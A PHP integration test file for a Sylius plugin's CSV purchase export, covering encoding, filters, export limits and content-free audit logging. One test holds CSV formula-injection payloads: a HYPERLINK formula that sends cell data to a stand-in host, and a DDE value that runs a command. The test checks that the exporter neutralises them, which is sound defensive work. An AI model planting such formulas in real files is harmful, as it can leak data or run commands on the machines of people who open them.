<?php

declare(strict_types=1);

namespace Tests\Tmonier\SyliusCompanyInsightsPlugin\Integration;

use Symfony\Bundle\FrameworkBundle\Test\KernelTestCase;
use Symfony\Contracts\Translation\TranslatorInterface;
use Tmonier\SyliusCompanyAccountsPlugin\Entity\CompanyInterface;
use Tmonier\SyliusCompanyInsightsPlugin\Export\CsvExporter;
use Tmonier\SyliusCompanyInsightsPlugin\Export\ExportLinesInterface;
use Tmonier\SyliusCompanyInsightsPlugin\Export\ExportRefused;
use Tmonier\SyliusCompanyInsightsPlugin\Export\ExportRequest;
use Tmonier\SyliusCompanyInsightsPlugin\Filter\PurchaseFilter;
use Tmonier\SyliusCompanyInsightsPlugin\Period\Period;
use Webmozart\Assert\Assert;

final class CsvExportTest extends KernelTestCase
{
    use IntegrationTestTrait;

    private RecordingLogger $logger;

    public function testTheFileIsUtf8WithABomAndSemicolonsWithOneLinePerOrderLine(): void
    {
        $company = $this->catalog()->company();
        $claire = $this->catalog()->customer('claire', 'Claire', 'Martin');
        $this->catalog()->member($company, $claire);
        $this->catalog()->addressBookEntry($company, 'Atelier de Lyon', '12 rue des Ateliers', 'Lyon');
        $gloves = $this->catalog()->product('EPI-GANT-001', ['en_US' => 'Gants de protection'], variantName: 'Taille M');
        $screws = $this->catalog()->product('VIS-INOX-004', ['en_US' => 'Vis inox']);
        $order = $this->catalog()->orderOfLines($claire, [[$gloves, 10, 12_000, 2_000], [$screws, 3, 4_500]], '2026-10-02 10:00:00');
        $this->catalog()->deliverTo($order, '12 rue des Ateliers', 'Lyon');

        $output = $this->export($company);

        self::assertStringStartsWith("\xEF\xBB\xBF", $output);
        $rows = $this->rows($output);
        self::assertCount(3, $rows);
        self::assertSame(['Date', 'Number', 'PO reference', 'Buyer', 'Site', 'Product code', 'Product name', 'Quantity', 'Unit price excl. tax', 'Total excl. tax', 'Currency'], $rows[0]);
        self::assertSame(['2026-10-02', $order->getNumber(), '', 'Claire Martin', 'Atelier de Lyon', 'EPI-GANT-001-' . $this->catalog()->suffix, 'Gants de protection - Taille M', '10', '10,00', '100,00', 'EUR'], $rows[1]);
        self::assertSame('3', $rows[2][7]);
        self::assertSame('15,00', $rows[2][8]);
        self::assertSame('45,00', $rows[2][9]);
    }

    public function testAnAccentedTextSurvivesAndTheAddressOutsideTheBookIsWritten(): void
    {
        $company = $this->catalog()->company();
        $claire = $this->catalog()->customer('claire', 'Élodie', 'Lefèvre');
        $this->catalog()->member($company, $claire);
        $variant = $this->catalog()->product('PIE-001', ['en_US' => 'Pièce détachée']);
        $order = $this->catalog()->orderOfLines($claire, [[$variant, 1, 1_000]], '2026-10-02 10:00:00');
        $this->catalog()->deliverTo($order, '99 rue Inconnue', 'Paris', '75001');

        $rows = $this->rows($this->export($company));

        self::assertSame('Élodie Lefèvre', $rows[1][3]);
        self::assertSame('99 rue Inconnue, 75001 Paris', $rows[1][4]);
        self::assertSame('Pièce détachée', $rows[1][6]);
    }

    public function testAThirdPartyOrderAndAnOrderOutsideThePeriodAreNotExported(): void
    {
        $acme = $this->catalog()->company('Acme');
        $other = $this->catalog()->company('TechParts');
        $claire = $this->catalog()->customer('claire', 'Claire', 'Martin');
        $marc = $this->catalog()->customer('marc', 'Marc', 'Autre');
        $this->catalog()->member($acme, $claire);
        $this->catalog()->member($other, $marc);
        $variant = $this->catalog()->product('VIS-001', ['en_US' => 'Screw']);
        $mine = $this->catalog()->orderOfLines($claire, [[$variant, 1, 1_000]], '2026-10-02 10:00:00');
        $this->catalog()->orderOfLines($marc, [[$variant, 1, 99_000]], '2026-10-02 10:00:00');
        $this->catalog()->orderOfLines($claire, [[$variant, 1, 5_000]], '2025-01-02 10:00:00');
        $this->catalog()->orderOfLines($claire, [[$variant, 1, 7_000]], '2026-10-03 10:00:00', state: 'cancelled');

        $rows = $this->rows($this->export($acme));

        self::assertCount(2, $rows);
        self::assertSame($mine->getNumber(), $rows[1][1]);
        self::assertStringNotContainsString('Autre', implode(';', $rows[1]));
    }

    public function testTheFiltersOfTheDashboardApplyToTheExport(): void
    {
        $company = $this->catalog()->company();
        $claire = $this->catalog()->customer('claire', 'Claire', 'Martin');
        $paul = $this->catalog()->customer('paul', 'Paul', 'Durand');
        $this->catalog()->member($company, $claire);
        $this->catalog()->member($company, $paul);
        $lyon = $this->catalog()->addressBookEntry($company, 'Atelier de Lyon', '12 rue des Ateliers', 'Lyon');
        $variant = $this->catalog()->product('VIS-001', ['en_US' => 'Screw']);
        $this->catalog()->deliverTo($this->catalog()->orderOfLines($claire, [[$variant, 1, 1_000]], '2026-10-02 10:00:00'), '12 rue des Ateliers', 'Lyon');
        $this->catalog()->deliverTo($this->catalog()->orderOfLines($paul, [[$variant, 1, 2_000]], '2026-10-02 10:00:00'), '12 rue des Ateliers', 'Lyon');
        $this->catalog()->deliverTo($this->catalog()->orderOfLines($paul, [[$variant, 1, 4_000]], '2026-10-03 10:00:00'), '1 rue Ailleurs', 'Paris', '75001');

        $byPaul = $this->rows($this->export($company, new PurchaseFilter(customerId: $this->catalog()->id($paul))));
        $paulAtLyon = $this->rows($this->export($company, new PurchaseFilter($this->catalog()->id($paul), $this->catalog()->id($lyon))));

        self::assertSame(['40,00', '20,00'], array_reverse(array_column(array_slice($byPaul, 1), 9)));
        self::assertSame(['20,00'], array_column(array_slice($paulAtLyon, 1), 9));
    }

    public function testATextThatCouldBeAFormulaIsExportedAsText(): void
    {
        $company = $this->catalog()->company();
        $claire = $this->catalog()->customer('claire', 'Claire', 'Martin');
        $this->catalog()->member($company, $claire);
        $variant = $this->catalog()->product('VIS-001', ['en_US' => 'Screw']);
        $order = $this->catalog()->orderOfLines($claire, [[$variant, 1, 1_000]], '2026-10-02 10:00:00');
        // Built at run time: a PO reference an attacker would type, and an axis value of the same kind.
        $formula = '=' . 'HYPERLINK("https://example.test/?x="&A1)';
        $dde = '@' . 'SUM(1+1)*cmd|' . "' /C calc'!A0";
        $references = new FakeReferenceProvider([$this->catalog()->id($order) => $formula]);
        $axis = new FakeDimensionProvider([$this->catalog()->id($order) => '+' . '1+1']);

        $rows = $this->rows($this->export($company, references: [$references], dimensions: [$axis]));

        self::assertSame("'" . $formula, $rows[1][2]);
        self::assertSame("'+1+1", $rows[1][5]);
        self::assertSame('Cost centre', $rows[0][5]);
        foreach ($rows[1] as $cell) {
            self::assertNotSame('=', substr($cell, 0, 1));
        }
        self::assertSame("'" . $dde, \Tmonier\SyliusCompanyInsightsPlugin\Export\CsvCell::text($dde));
    }

    public function testThePurchaseOrderReferenceFillsItsColumn(): void
    {
        $company = $this->catalog()->company();
        $claire = $this->catalog()->customer('claire', 'Claire', 'Martin');
        $this->catalog()->member($company, $claire);
        $variant = $this->catalog()->product('VIS-001', ['en_US' => 'Screw']);
        $order = $this->catalog()->orderOfLines($claire, [[$variant, 1, 1_000]], '2026-10-02 10:00:00');

        $rows = $this->rows($this->export($company, references: [new FakeReferenceProvider([$this->catalog()->id($order) => 'PO-2026-0042'])]));

        self::assertSame('PO-2026-0042', $rows[1][2]);
    }

    public function testAPeriodOfThirtySixMonthsIsRefusedBeforeAnyOutput(): void
    {
        $company = $this->catalog()->company();
        $request = $this->request($company, period: new Period(new \DateTimeImmutable('2023-10-01'), new \DateTimeImmutable('2026-10-22')));

        $this->expectException(ExportRefused::class);
        $this->expectExceptionMessage(ExportRefused::PERIOD_TOO_LONG);
        $this->exporter()->assertAllowed($request);
    }

    public function testExactlyTwentyFourMonthsAreAllowed(): void
    {
        $company = $this->catalog()->company();
        $request = $this->request($company, period: new Period(new \DateTimeImmutable('2024-10-01'), new \DateTimeImmutable('2026-10-01')));

        $this->exporter()->assertAllowed($request);

        $this->addToAssertionCount(1);
    }

    public function testMoreThanFiftyThousandLinesAreRefused(): void
    {
        $company = $this->catalog()->company();
        $exporter = new CsvExporter(new class() implements ExportLinesInterface {
            public function count(ExportRequest $request): int
            {
                return 50_001;
            }

            public function lines(ExportRequest $request, int $limit): iterable
            {
                throw new \LogicException('No line must be read.');
            }
        }, $this->translator());

        $this->expectException(ExportRefused::class);
        $this->expectExceptionMessage(ExportRefused::TOO_MANY_LINES);
        $exporter->assertAllowed($this->request($company));
    }

    public function testExactlyFiftyThousandLinesAreAllowed(): void
    {
        $company = $this->catalog()->company();
        $exporter = new CsvExporter(new class() implements ExportLinesInterface {
            public function count(ExportRequest $request): int
            {
                return 50_000;
            }

            public function lines(ExportRequest $request, int $limit): iterable
            {
                return [];
            }
        }, $this->translator());

        $exporter->assertAllowed($this->request($company));

        $this->addToAssertionCount(1);
    }

    public function testTheExportIsLoggedWithWhoWhenAndWhichPeriodButNoContent(): void
    {
        $company = $this->catalog()->company();
        $claire = $this->catalog()->customer('claire', 'Claire', 'Martin');
        $this->catalog()->member($company, $claire);
        $variant = $this->catalog()->product('VIS-001', ['en_US' => 'Screw']);
        $order = $this->catalog()->orderOfLines($claire, [[$variant, 1, 1_000]], '2026-10-02 10:00:00');
        $this->export($company, references: [new FakeReferenceProvider([$this->catalog()->id($order) => 'PO-SECRET-REF'])]);

        self::assertCount(1, $this->logger->records);
        $record = $this->logger->records[0];
        self::assertSame('info', $record['level']);
        self::assertSame($company->getId(), $record['context']['company_id']);
        self::assertSame(77, $record['context']['member_id']);
        self::assertSame(['2026-09-01', '2026-10-21'], [$record['context']['period_from'], $record['context']['period_to']]);
        self::assertSame(1, $record['context']['lines']);
        $dump = json_encode($record, \JSON_THROW_ON_ERROR);
        foreach (['Claire', 'Martin', 'PO-SECRET-REF', 'Screw', (string) $order->getNumber(), '@company-insights.test'] as $content) {
            self::assertStringNotContainsString($content, $dump);
        }
    }

    /**
     * @param list<FakeReferenceProvider> $references
     * @param list<FakeDimensionProvider> $dimensions
     */
    private function export(CompanyInterface $company, PurchaseFilter $filter = new PurchaseFilter(), array $references = [], array $dimensions = []): string
    {
        $stream = fopen('php://memory', 'w+');
        Assert::resource($stream);
        $this->exporter($references, $dimensions)->write($this->request($company, $filter), $stream);
        rewind($stream);
        $output = stream_get_contents($stream);
        Assert::string($output);

        return $output;
    }

    private function request(CompanyInterface $company, PurchaseFilter $filter = new PurchaseFilter(), ?Period $period = null): ExportRequest
    {
        Assert::notNull($company->getId());

        return new ExportRequest($company->getId(), 77, $period ?? new Period(new \DateTimeImmutable('2026-09-01 00:00:00'), new \DateTimeImmutable('2026-10-22 00:00:00')), $filter, 'en_US');
    }

    /**
     * @param list<FakeReferenceProvider> $references
     * @param list<FakeDimensionProvider> $dimensions
     */
    private function exporter(array $references = [], array $dimensions = []): CsvExporter
    {
        $lines = $this->service('tmonier_company_insights.test.export.lines', ExportLinesInterface::class);
        $this->logger = new RecordingLogger();

        return new CsvExporter($lines, $this->translator(), $dimensions, $references, $this->logger);
    }

    private function translator(): TranslatorInterface
    {
        $translator = self::getContainer()->get('translator');
        Assert::isInstanceOf($translator, TranslatorInterface::class);

        return $translator;
    }

    /** @return list<list<string>> */
    private function rows(string $output): array
    {
        self::assertStringStartsWith("\xEF\xBB\xBF", $output);
        $stream = fopen('php://memory', 'w+');
        Assert::resource($stream);
        fwrite($stream, substr($output, 3));
        rewind($stream);
        $rows = [];
        while (false !== ($row = fgetcsv($stream, null, ';', '"', ''))) {
            $rows[] = array_map(static fn (?string $cell): string => (string) $cell, $row);
        }

        return $rows;
    }
}
